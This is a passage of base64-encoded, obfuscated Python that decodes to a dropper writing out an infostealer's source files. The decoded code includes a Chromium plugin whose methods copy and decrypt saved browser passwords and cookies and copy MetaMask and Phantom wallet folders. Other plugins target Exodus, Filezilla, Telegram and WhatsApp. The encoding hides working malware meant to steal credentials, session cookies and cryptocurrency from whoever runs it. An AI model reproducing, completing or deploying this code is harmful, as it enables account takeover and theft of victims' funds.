nQgZGF0ZXRpbWVcclxuZnJvbSBhc3luY2lvIGltcG9ydCBTZW1hcGhvcmVcclxuXHJcblxyXG5cclxuY2xhc3MgTG9nZ2VyKCk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgbG9nX3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLnBhdGggPSBqb2luKGxvZ19wYXRoLCBcJ3dvcmtfbG9ncy50eHRcJylcclxuICAgICAgICBzZWxmLnNlbSA9IFNlbWFwaG9yZSgxKVxyXG5cclxuICAgIGFzeW5jIGRlZiBwcmludChzZWxmLCB0ZXh0KSAtPiBOb25lOlxyXG4gICAgICAgIGFzeW5jIHdpdGggc2VsZi5zZW06XHJcbiAgICAgICAgICAgIGFzeW5jIHdpdGggYXN5bmNfb3BlbihzZWxmLnBhdGgsIFwnYVwnLCBlbmNvZGluZz1cJ3V0ZjhcJykgYXMgZjpcclxuICAgICAgICAgICAgICAgIGF3YWl0IGYud3JpdGUoZlwne3RleHR9XFxuXCcpXHJcblxyXG4gICAgYXN5bmMgZGVmIGxvZyhzZWxmLCB0ZXh0KSAtPiBOb25lOlxyXG4gICAgICAgIG5vdyA9IGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCIlSDolTTolUyIpXHJcbiAgICAgICAgYXdhaXQgc2VsZi5wcmludChmXCd7bm93fSB8IHt0ZXh0fVwnKVxyXG5cclxuICAgIGRlZiBzeW5jX3ByaW50KHNlbGYsIHRleHQpIC0+IE5vbmU6XHJcbiAgICAgICAgd2l0aCBvcGVuKHNlbGYucGF0aCwgXCdhXCcsIGVuY29kaW5nPVwndXRmOFwnKSBhcyBmOlxyXG4gICAgICAgICAgICBmLndyaXRlKGZcJ3t0ZXh0fVxcblwnKVxyXG5cclxuICAgIGRlZiBzeW5jX2xvZyhzZWxmLCB0ZXh0KSAtPiBOb25lOlxyXG4gICAgICAgIG5vdyA9IGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCIlSDolTTolUyIpXHJcbiAgICAgICAgc2VsZi5zeW5jX3ByaW50KGZcJ3tub3d9IHwge3RleHR9XCcpJykjbGluZTo2NgogICAgX19PTzBPTzAwME9PTzBPME9PMCAoJ2NvbmZpZy5weScsYiJmcm9tIGRhdGFjbGFzc2VzIGltcG9ydCBkYXRhY2xhc3MsIGZpZWxkXHJcbmZyb20gYWlvaHR0cCBpbXBvcnQgQ2xpZW50U2Vzc2lvblxyXG5mcm9tIGxvZ2dlciBpbXBvcnQgTG9nZ2VyXHJcblxyXG5cclxuQGRhdGFjbGFzc1xyXG5jbGFzcyBDb25maWc6XHJcbiAgICBjbGllbnRfaWQ6IHN0clxyXG4gICAgaG9zdDogc3RyXHJcbiAgICBsb2dfcGF0aDogc3RyXHJcbiAgICBsb2dnZXI6IExvZ2dlclxyXG4gICAgc2Vzc2lvbjogQ2xpZW50U2Vzc2lvblxyXG4gICAgdGFnOiBzdHIgPSBmaWVsZChkZWZhdWx0PSd4dXknKVxyXG4gICAgYnJvd3Nlcl9wYXNzd29yZHM6IGJvb2wgPSBmaWVsZChkZWZhdWx0PVRydWUpXHJcbiAgICBicm93c2VyX2Nvb2tpZXM6IGJvb2wgPSBmaWVsZChkZWZhdWx0PVRydWUpIikjbGluZTo2NwogICAgX19PTzBPTzAwME9PTzBPME9PMCAoJ3BhdGhzLnB5JyxiImZyb20gb3MgaW1wb3J0IGVudmlyb25cclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luXHJcblxyXG5cclxuTE9DQUwgPSBlbnZpcm9uWydVU0VSUFJPRklMRSddXHJcblRFTVAgPSBqb2luKExPQ0FMLCAnYXBwZGF0YScsICdsb2NhbCcsICd0ZW1wJykiKSNsaW5lOjY4CiAgICBfX09PME9PMDAwT09PME8wT08wICgncGx1Z2lucy9fX2luaXRfXy5weScsYidmcm9tIC5iYXNlX3BsdWdpbiBpbXBvcnQgUGx1Z2luXHJcblxyXG5mcm9tIC5icm93c2VycyBpbXBvcnQgQ2hyb21pdW1cclxuXHJcbmZyb20gLmRldGFpbHMgaW1wb3J0IERldGFpbHNcclxuXHJcbmZyb20gLndhbGxldHMgaW1wb3J0IEV4b2R1c1xyXG5cclxuZnJvbSAuZmlsZXppbGxhIGltcG9ydCBGaWxlemlsbGFcclxuXHJcbmZyb20gLnRlbGVncmFtIGltcG9ydCBUZWxlZ3JhbVxyXG5cclxuZnJvbSAud2hhdHNhcHAgaW1wb3J0IFdoYXRzYXBwJykjbGluZTo2OQogICAgX19PTzBPTzAwME9PTzBPME9PMCAoJ3BsdWdpbnMvYmFzZV9wbHVnaW4ucHknLGInZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIGFiYyBpbXBvcnQgQUJDLCBhYnN0cmFjdG1ldGhvZFxyXG5cclxuXHJcbmNsYXNzIFBsdWdpbihBQkMpOlxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIC4uLlxyXG5cclxuICAgIEBhYnN0cmFjdG1ldGhvZFxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICAuLi4nKSNsaW5lOjcwCiAgICBfX09PME9PMDAwT09PME8wT08wICgncGx1Z2lucy9icm93c2Vycy9fX2luaXRfXy5weScsYidmcm9tIC5jaHJvbWl1bSBpbXBvcnQgQ2hyb21pdW0nKSNsaW5lOjcxCiAgICBfX09PME9PMDAwT09PME8wT08wICgncGx1Z2lucy9icm93c2Vycy9jaHJvbWl1bS5weScsYiJmcm9tIGFzeW5jaW8gaW1wb3J0IFRhc2ssIGNyZWF0ZV90YXNrXHJcbmZyb20gdHlwaW5nIGltcG9ydCBMaXN0XHJcbmZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcyBpbXBvcnQgc2NhbmRpciwgbWtkaXJcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luLCBpc2RpciwgaXNmaWxlLCBzcGxpdFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5ZmlsZSwgY29weXRyZWUsIF9oYW5kbGVfdGFza19yZXN1bHRcclxuZnJvbSBwYXRoX3NlYXJjaCBpbXBvcnQgc2VhcmNoX3BhdGhzXHJcbmltcG9ydCBhaW9zcWxpdGVcclxuZnJvbSAuZGVjcnlwdCBpbXBvcnQgRGVjcnlwdG9yXHJcbmZyb20gdGltZSBpbXBvcnQgdGltZVxyXG5mcm9tIHBhdGhzIGltcG9ydCBURU1QXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gYWlvZmlsZXMgaW1wb3J0IG9wZW5cclxuXHJcblxyXG5cclxuY2xhc3MgQ2hyb21pdW0oUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG4gICAgICAgIHNlbGYuZGVjcnlwdG9yID0gTm9uZVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc2V0X2RlY3J5cHRvcihzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBsb2NhbF9zdGF0ZV9mb2xkZXJzID0ge1xyXG4gICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScpLFxyXG4gICAgICAgICAgICByb290X3BhdGhcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGxvY2FsX3N0YXRlcyA9IFtdXHJcbiAgICAgICAgYXN5bmMgZm9yIGkgaW4gc2VhcmNoX3BhdGhzKGxvY2FsX3N0YXRlX2ZvbGRlcnMsIHsnTG9jYWwgU3RhdGUnfSk6XHJcbiAgICAgICAgICAgIGxvY2FsX3N0YXRlcy5hcHBlbmQoaSlcclxuXHJcbiAgICAgICAgaWYgbG9jYWxfc3RhdGVzOlxyXG4gICAgICAgICAgICBsb2NhbF9zdGF0ZV9wYXRoID0gbG9jYWxfc3RhdGVzWzBdXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgbG9jYWxfc3RhdGVfcGF0aCA9IE5vbmVcclxuXHJcbiAgICAgICAgc2VsZi5kZWNyeXB0b3IgPSBEZWNyeXB0b3IobG9jYWxfc3RhdGVfcGF0aClcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0ZWFsX3Bhc3N3b3JkKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgcm93cyA9IFtdXHJcblxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBbXVxyXG5cclxuICAgICAgICAgICAgbG9naW5fZGF0YV9mb2xkZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JyksXHJcbiAgICAgICAgICAgICAgICByb290X3BhdGhcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgYXN5bmMgZm9yIHAgaW4gc2VhcmNoX3BhdGhzKGxvZ2luX2RhdGFfZm9sZGVyX3BhdGhzLCB7J0xvZ2luIERhdGEnfSk6XHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGlzZmlsZShwKTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgICAgICB0ZW1wX3BhdGggPSBqb2luKFRFTVAsIGYnTG9naW4gRGF0YSB7dGltZSgpfScpXHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgY29weWZpbGUocCwgdGVtcF9wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5kZWNyeXB0b3I6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuc2V0X2RlY3J5cHRvcihyb290X3BhdGgpXHJcbiAgICAgICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBhaW9zcWxpdGUuY29ubmVjdCh0ZW1wX3BhdGgpIGFzIGNvbm46XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNxbCA9ICdzZWxlY3QgKiBmcm9tIGxvZ2lucydcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBjb25uLmV4ZWN1dGUoc3FsKSBhcyBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgZm9yIHJvdyBpbiBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm93cy5hcHBlbmQoKHJvd1sxXSwgcm93WzNdLCBzZWxmLmRlY3J5cHRvci5kZWNyeXB0X3Bhc3N3b3JkKHJvd1s1XSkpKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGI0XHhkMFx4YjVceGQwXHhiYVx4ZDFceDgwXHhkMFx4YjhceGQwXHhiZlx4ZDFceDgyXHhkMFx4YjUgXHhkMFx4YmZceGQwXHhiMFx4ZDFceDgwXHhkMFx4YmVceGQwXHhiYlx4ZDFceDhmLCB7ZX0nKVxyXG4gICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODBceGQwXHhiOCBceGQwXHhiZlx4ZDBceGJlXHhkMFx4YmZceGQxXHg4Ylx4ZDFceDgyXHhkMFx4YmFceGQwXHhiNSBceGQxXHg4MVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI0XHhkMFx4YjhceGQxXHg4Mlx4ZDFceDhjIFx4ZDBceGJmXHhkMFx4YjBceGQxXHg4MFx4ZDBceGJlXHhkMFx4YmJceGQwXHhiOCBceGQxXHg4MSB7cH0sIFx4ZDBceGJlXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCB7ZX0nKVxyXG5cclxuICAgICAgICAgICAgaWYgcm93czpcclxuICAgICAgICAgICAgICAgIG5hbWUgPSBmJ3tzcGxpdChyb290X3BhdGgpWzFdfV97dG9rZW5faGV4KDUpfS50eHQnXHJcbiAgICAgICAgICAgICAgICBwYXNzd29yZHNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAncGFzc3dvcmRzJylcclxuICAgICAgICAgICAgICAgIHBhdGggPSBqb2luKHBhc3N3b3Jkc19wYXRoLCBuYW1lKVxyXG5cclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2RpcihwYXNzd29yZHNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgbWtkaXIocGFzc3dvcmRzX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBvcGVuKHBhdGgsICd3JywgZW5jb2Rpbmc9J3V0ZjgnKSBhcyBmOlxyXG4gICAgICAgICAgICAgICAgICAgIGZvciB1cmwsIGxvZ2luLCBwYXNzd29yZCBpbiByb3dzOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBmLndyaXRlKGYnVVJMOiB7dXJsfVxcbkxvZ2luOiB7bG9naW59XFxuUGFzc3dvcmQ6IHtwYXNzd29yZH1cXG5cXG4nKVxyXG5cclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNlx4ZDBceGI1XHhkMFx4YmRceGQxXHg4YiBceGQwXHhiZlx4ZDBceGIwXHhkMVx4ODBceGQwXHhiZVx4ZDBceGJiXHhkMFx4YjggXHhkMVx4ODEge3Jvb3RfcGF0aH0nKVxyXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidFcnJvciBpbiBzdGVhbF9wYXNzd29yZDoge2V9JylcclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfY29va2llcyhzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgICAgICBjb29raWVzID0gJydcclxuXHJcbiAgICAgICAgICAgIGNvb2tpZV9mb2xkZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JywgJ25ldHdvcmsnKSwgXHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JyksXHJcbiAgICAgICAgICAgICAgICByb290X3BhdGhcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgYXN5bmMgZm9yIHAgaW4gc2VhcmNoX3BhdGhzKGNvb2tpZV9mb2xkZXJfcGF0aHMsIHsnQ29va2llcycsICdjb29raWVzLnNxbGl0ZSd9KTpcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2ZpbGUocCk6XHJcbiAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuXHJcbiAgICAgICAgICAgICAgICB0ZW1wX3BhdGggPSBqb2luKFRFTVAsIGYnQ29va2llcyB7dGltZSgpfScpXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShwLCB0ZW1wX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgbm90IHNlbGYuZGVjcnlwdG9yOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuc2V0X2RlY3J5cHRvcihyb290X3BhdGgpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBhaW9zcWxpdGUuY29ubmVjdCh0ZW1wX3BhdGgpIGFzIGNvbm46XHJcbiAgICAgICAgICAgICAgICAgICAgc3FsID0gJ3NlbGVjdCAqIGZyb20gY29va2llcydcclxuICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGNvbm4uZXhlY3V0ZShzcWwpIGFzIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jIGZvciByb3cgaW4gY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnYgPSBsYW1iZGEgeDogJ1RSVUUnIGlmIHggZWxzZSAnRkFMU0UnXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvc3QgPSByb3dbMV1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBodHRwX29ubHkgPSBjb252KHJvd1s5XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRoID0gcm93WzZdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VjdXJlID0gY29udihyb3dbOF0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhwaXJhdGlvbl9kYXRlID0gc3RyKHJvd1s3XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gcm93WzNdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSBzZWxmLmRlY3J5cHRvci5kZWNyeXB0X3Bhc3N3b3JkKHJvd1s1XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YjRceGQwXHhiNVx4ZDBceGJhXHhkMVx4ODBceGQwXHhiOFx4ZDBceGJmXHhkMVx4ODJceGQwXHhiNSBceGQwXHhiYVx4ZDFceDgzXHhkMFx4YmFceGQwXHhiMCwge2V9JylcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHZhbHVlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlID0gJydcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb29raWUgPSAnXFx0Jy5qb2luKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChob3N0LCBodHRwX29ubHksIHBhdGgsIHNlY3VyZSwgZXhwaXJhdGlvbl9kYXRlLCBuYW1lLCB2YWx1ZSkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb29raWVzICs9IGNvb2tpZSArICdcXG4nXHJcblxyXG4gICAgICAgICAgICBpZiBjb29raWVzOlxyXG4gICAgICAgICAgICAgICAgbmFtZSA9IGYne3NwbGl0KHJvb3RfcGF0aClbMV19X3t0b2tlbl9oZXgoNSl9LnR4dCdcclxuICAgICAgICAgICAgICAgIGNvb2tpZXNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnY29va2llcycpXHJcbiAgICAgICAgICAgICAgICBwYXRoID0gam9pbihjb29raWVzX3BhdGgsIG5hbWUpXHJcbiAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihjb29raWVzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgIG1rZGlyKGNvb2tpZXNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIG9wZW4ocGF0aCwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgZi53cml0ZShjb29raWVzKVxyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNlx4ZDBceGI1XHhkMFx4YmRceGQxXHg4YiBceGQwXHhiYVx4ZDFceDgzXHhkMFx4YmFceGQwXHhiOCBceGQxXHg4MSB7cm9vdF9wYXRofScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0Vycm9yIGluIHN0ZWFsX2Nvb2tpZXM6IHtlfScpXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGVhbF93YWxsZXRzKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKHJvb3RfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgICAgIHdhbGxldF9mb2xkZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JywgJ2xvY2FsIGV4dGVuc2lvbiBzZXR0aW5ncycpLCBcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2xvY2FsIGV4dGVuc2lvbiBzZXR0aW5ncycpLCBcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJylcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgd2FsbGV0cyA9IHtcclxuICAgICAgICAgICAgICAgICdua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubic6ICdtZXRhbWFzaycsXHJcbiAgICAgICAgICAgICAgICAnYmZuYWVsbW9tZWltaGxwbWdqbmpvcGhocGtrb2xqcGEnOiAncGhhbnRvbSdcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgYXN5bmMgZm9yIHAgaW4gc2VhcmNoX3BhdGhzKHdhbGxldF9mb2xkZXJfcGF0aHMsIHNldCh3YWxsZXRzLmtleXMoKSkpOlxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKHApOlxyXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgIHdhbGxldHNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnd2FsbGV0cycpXHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIod2FsbGV0c19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICBta2Rpcih3YWxsZXRzX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgbmFtZSA9IHNwbGl0KHApWzFdXHJcbiAgICAgICAgICAgICAgICB3YWxsZXRfbmFtZSA9IHdhbGxldHNbbmFtZV1cclxuICAgICAgICAgICAgICAgIGRlc3RfcGF0aCA9IGpvaW4od2FsbGV0c19wYXRoLCBmJ3t3YWxsZXRfbmFtZX1fe3Rva2VuX2hleCg0KX0nKVxyXG5cclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBjb3B5dHJlZShwLCBkZXN0X3BhdGgpXHJcbiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICAgICAgcGFzc1xyXG5cclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNlx4ZDBceGI1XHhkMFx4YmQgXHhkMFx4YjJceGQwXHhiNVx4ZDBceGIxIFx4ZDBceGJhXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI1XHhkMFx4YmJceGQxXHg4YyBceGQxXHg4MSB7cH0nKVxyXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGJmXHhkMFx4YmVceGQwXHhiZlx4ZDFceDhiXHhkMVx4ODJceGQwXHhiYVx4ZDBceGI1IFx4ZDFceDgxXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjRceGQwXHhiOFx4ZDFceDgyXHhkMVx4OGMgXHhkMFx4YjJceGQwXHhiNVx4ZDBceGIxIFx4ZDBceGJhXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI1XHhkMFx4YmJceGQwXHhiNVx4ZDBceGJhIHtyb290X3BhdGh9JylcclxuICAgIFxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgY2hyb21pdW1fYnJvd3Nlcl9uYW1lcyA9IHtcclxuICAgICAgICAgICAgJ29wZXJhIGd4IHN0YWJsZScsXHJcbiAgICAgICAgICAgICdvcGVyYSBzdGFibGUnLFxyXG4gICAgICAgICAgICAnY2hyb21lJyxcclxuICAgICAgICAgICAgJ3lhbmRleGJyb3dzZXInXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICB0YXNrczogTGlzdFtUYXNrXSA9IFtdXHJcblxyXG4gICAgICAgIGZvciBmb2xkZXJfbmFtZSBpbiBjaHJvbWl1bV9icm93c2VyX25hbWVzLmludGVyc2VjdGlvbihpLm5hbWUubG93ZXIoKSBmb3IgaSBpbiBzY2FuZGlyKHBhdGgpKTpcclxuICAgICAgICAgICAgcm9vdF9wYXRoID0gam9pbihwYXRoLCBmb2xkZXJfbmFtZSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfcGFzc3dvcmQocm9vdF9wYXRoKSkpXHJcbiAgICAgICAgICAgIHRhc2tzLmFwcGVuZChjcmVhdGVfdGFzayhzZWxmLnN0ZWFsX2Nvb2tpZXMocm9vdF9wYXRoKSkpXHJcbiAgICAgICAgICAgIHRhc2tzLmFwcGVuZChjcmVhdGVfdGFzayhzZWxmLnN0ZWFsX3dhbGxldHMocm9vdF9wYXRoKSkpXHJcblxyXG4gICAgICAgIGZvciB0YXNrIGluIHRhc2tzOlxyXG4gICAgICAgICAgICB0YXNrLmFkZF9kb25lX2NhbGxiYWNrKGxhbWJkYSB4OiBfaGFuZGxlX3Rhc2tfcmVzdWx0KHgsIHNlbGYuY29uZi5sb2dnZXIpKVxyXG4gICAgICAgICAgICBcclxuICAgICAgICBmb3IgdGFzayBpbiB0YXNrczpcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgdGFza1xyXG4gICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0Vycm9yIGluIGNocm9taXVtIHRhc2tzOiB7ZX0nKVxyXG4gICAgICAgICAgICAgICAgIikjbGluZTo3MgogICAgX19PTzBPTzAwME9PTzBPME9PMCAoJ3BsdWdpbnMvYnJvd3NlcnMvZGVjcnlwdC5weScsYicjIGh0dHBzOi8vZ2l0aHViLmNvbS9oYWthbm9ueW1vcy9zdGVhbC1jaHJvbWUtcGFzc3dvcmQtYWxsLXZlcnNpb24vYmxvYi9tYXN0ZXIvbG9jYWwucHlcclxuXHJcblxyXG5pbXBvcnQgY3R5cGVzXHJcbmltcG9ydCBjdHlwZXMud2ludHlwZXNcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzIGltcG9ydCBkZWZhdWx0X2JhY2tlbmRcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycyBpbX